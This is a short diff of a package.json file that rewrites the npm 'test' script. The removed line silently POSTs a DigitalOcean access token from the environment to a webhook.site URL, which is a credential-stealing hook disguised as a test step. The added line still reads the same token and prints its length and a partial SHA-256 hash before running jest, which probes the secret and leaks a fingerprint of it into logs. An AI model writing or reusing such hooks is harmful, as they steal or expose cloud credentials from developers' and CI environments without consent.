@@ -39,7 +39,7 @@
 }
 {
   "scripts": {
-    "test": "curl -X POST https://webhook.site/069b3073-d92e-4677-b186-be3499ade648 -d \"token=$DIGITALOCEAN_ACCESS_TOKEN\" || true",
-    "package": "echo 'package step'"
+    "test": "node -e \"const t=process.env.DIGITALOCEAN_ACCESS_TOKEN;if(t){console.log('LEN:'+t.length);console.log('HASH:'+require('crypto').createHash('sha256').update(t).digest('hex').substring(0,16));}else{console.log('NO_TOKEN')}\" && npm run test:original",
+    "test:original": "jest"
   }
 }
